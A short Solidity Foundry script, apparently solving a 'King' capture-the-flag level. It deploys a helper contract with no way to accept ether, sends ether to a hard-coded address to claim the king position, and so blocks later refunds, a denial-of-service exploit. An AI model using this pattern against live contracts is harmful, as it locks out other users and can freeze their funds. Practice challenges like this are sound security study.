/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract KingSend {
    function send(address _king) public payable {
        address payable king = payable(_king);
        (bool success, ) = king.call{value: msg.value, gas: 300000}("");
        require(success, "Transfer failed");
    }
}

contract King is Script {
    function run() public {
        vm.startBroadcast();

        KingSend kingSend = new KingSend();
        kingSend.send{value: 0.002 ether}(0xC7F51059e6002c334d49B68295d0f0df4447592D);

        vm.stopBroadcast();
    }
}
